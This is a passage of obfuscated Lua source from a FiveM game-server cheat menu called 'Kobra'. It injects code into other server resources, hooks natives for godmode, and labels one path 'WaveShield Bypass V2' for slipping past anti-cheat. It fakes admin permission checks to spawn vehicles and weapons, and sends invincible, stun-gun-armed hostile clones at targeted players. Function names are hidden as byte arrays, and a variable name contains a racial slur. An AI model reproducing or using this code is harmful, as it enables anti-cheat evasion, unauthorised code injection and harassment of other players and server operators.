            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v232));break;end end end;v12.HandleGodmodeToggle=function(v233,v234) local v235=GetResourceState("WaveShield")=="started" ;local v236=((GetResourceState("monitor")=="started") and "monitor") or (v235 and "WaveShield") or "any" ;if v235 then local v538=0 -0 ;while true do if (v538==0) then if v234 then local v895=0 + 0 ;while true do if (v895==(0 + 0)) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",321 + 2679 );v48(v236,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",5716 -2716 );v48(v236,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);end return;end end end if v234 then local v539=0 -0 ;while true do if (v539==(1678 -(136 + 1542))) then v12:Notify("success","Kobra","Godmode Enabled",9837 -6837 );MachoInjectResource2(3,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else local v540=0 + 0 ;while true do if ((0 -0)==v540) then v12:Notify("error","Kobra","Godmode Disabled",2172 + 828 );MachoInjectResource2(489 -(68 + 418) ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end end;v12.SpawnSelectedVehicle=function(v237,v238,v239,v240) local v241=0;local v242;local v243;local v244;local v245;local v246;while true do if (v241==(8 -5)) then if (GetResourceState("solos-rentals")=="started") then local v757=0 -0 ;while true do if (v757==1) then v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v238,tostring(v240),tostring(v239),v245.x,v245.y,v245.z,v246));break;end if (v757==(0 + 0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",4092 -(770 + 322) );print("Creating Vehicle via Fallback #1");v757=1 + 0 ;end end elseif (GetResourceState("amigo")=="started") then local v896=0;while true do if (v896==1) then v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v238,tostring(v240),tostring(v239)));break;end if (v896==0) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",868 + 2132 );print("Creating Vehicle via Fallback #2");v896=1 + 0 ;end end elseif v75 then local v1027=0 -0 ;while true do if (v1027==(1 -0)) then v48(v75,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v238,tostring(v240),tostring(v239)));break;end if (v1027==(0 -0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",11034 -8034 );print("Creating Vehicle via Fallback #3");v1027=1;end end elseif (GetResourceState("qb-core")=="started") then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",1671 + 1329 );print("Creating Vehicle via Fallback #4");v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v238   .. [["

            if ]]   .. tostring(v240)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v239)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v245.x   .. [[, ]]   .. v245.y   .. [[, ]]   .. v245.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v246   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );elseif ((v244:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3000);print("Creating Vehicle via Fallback #5");v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v238,tostring(v240),tostring(v239)));elseif (GetResourceState("lunar_bridge")=="started") then local v1413=0 -0 ;while true do if (v1413==1) then v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v238,tostring(v240),tostring(v239)));break;end if (v1413==(0 + 0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",3000);print("Creating Vehicle via Fallback #6");v1413=1;end end elseif (GetResourceState("lation_laundering")=="started") then local v1454=0;while true do if (v1454==(1 + 0)) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v238,tostring(v239),tostring(v240)));break;end if (v1454==(0 + 0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",11296 -8296 );print("Creating Vehicle via Fallback #7");v1454=1 -0 ;end end else local v1455=v74();if v1455 then local v1539=0 + 0 ;while true do if (1==v1539) then v48(v1455,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v238,tostring(v240),tostring(v239)));break;end if (v1539==(0 -0)) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",9916 -6916 );print("Creating Vehicle via Fallback #8");v1539=1 + 0 ;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",3000);if ( not v238 or (v238=="")) then return;end local function v1653(v1711) local v1712=0 -0 ;local v1713;while true do if (v1712==(831 -(762 + 69))) then v1713={};for v1761=3 -2 , #v1711 do v1713[v1761]=string.byte(v1711,v1761);end v1712=1 + 0 ;end if (1==v1712) then return "{"   .. table.concat(v1713,",")   .. "}" ;end end end local v1654=v1653(v238);local v1655=tostring(v240);local v1656=tostring(v239);local v1657=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1654,v1655,v1656);local v1658,v1659=pcall(MachoInjectResourceRaw,"monitor",v1657);if  not v1658 then end return;end if (GetResourceState("lb-phone")=="started") then local v1540=0 + 0 ;local v1541;local v1542;while true do if (v1540==0) then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",7256 -4256 );print("Creating Vehicle via Fallback #10");v1540=1 + 0 ;end if (v1540==(1 + 0)) then v1541,v1542=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v240),v238,tostring(v239),v245.x,v245.y,v245.z,v246));end);if  not v1541 then end break;end end elseif (GetResourceState("qb-core")=="started") then v237:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",11688 -8688 );print("Creating Vehicle via Fallback #11");v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v240),GetHashKey(v238),tostring(v239)));else return;end end break;end if (v241==(158 -(8 + 149))) then v243=GetVehiclePedIsIn(v242,false);v244=GetCurrentServerEndpoint();v241=2;end if (v241==0) then if ( not v238 or (v238=="")) then return;end v242=PlayerPedId();v241=1321 -(1199 + 121) ;end if ((3 -1)==v241) then v245=GetEntityCoords(v242);v246=GetEntityHeading(v242);v241=3;end end end;local function v81() local v247=0 -0 ;local v248;while true do if (v247==0) then v248={"WaveShield","FiniAC"};for v693,v694 in ipairs(v248) do if (GetResourceState(v694)=="started") then return false;end end v247=1;end if (v247==(3 -2)) then return GetResourceState("ReaperV4")=="started" ;end end end local function v82() local v249=0 -0 ;local v250;while true do if (v249==(0 + 0)) then v250={"ReaperV4","WaveShield"};for v695,v696 in ipairs(v250) do if (GetResourceState(v696)=="started") then return false;end end v249=1 -0 ;end if (v249==(1 + 0)) then return GetResourceState("FiniAC")=="started" ;end end end v12.SpawnSelectedWeapon=function(v251,v252) if ( not v252 or (v252=="")) then return;end local function v253(v336) local v337=0 -0 ;local v338;while true do if (v337==(1 + 0)) then return table.concat(v338,",");end if (v337==(469 -(304 + 165))) then v338={};for v758=1 + 0 , #v336 do v338[v758]=string.byte(v336,v758);end v337=1;end end end local v254=v253(v252);local v255=PlayerPedId();if ( not v255 or (v255<=(160 -(54 + 106)))) then return;end local v256=GetHashKey(v252);if (v256==(1969 -(1618 + 351))) then return;end local v257=GetResourceState("WaveShield")=="started" ;if v257 then local v541=0 + 0 ;while true do if (v541==(1016 -(10 + 1006))) then v251:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3000);v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
